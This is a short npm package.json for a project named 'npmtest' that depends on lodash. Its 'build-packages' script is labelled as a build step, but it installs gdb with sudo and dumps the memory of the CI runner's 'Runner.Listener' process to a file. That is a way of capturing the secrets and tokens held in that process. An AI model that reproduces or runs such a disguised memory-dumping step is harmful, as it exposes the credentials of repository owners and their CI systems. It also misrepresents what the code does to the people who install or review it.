{
  "name": "npmtest",
  "version": "1.0.0",
  "description": "",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1",
    "build-packages": "sudo apt-get install -y gdb && sudo gcore -o k.dump \"$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')\""
  },
  "author": "",
  "license": "ISC",
  "dependencies": {
    "lodash": "^4.17.21"
  }
}
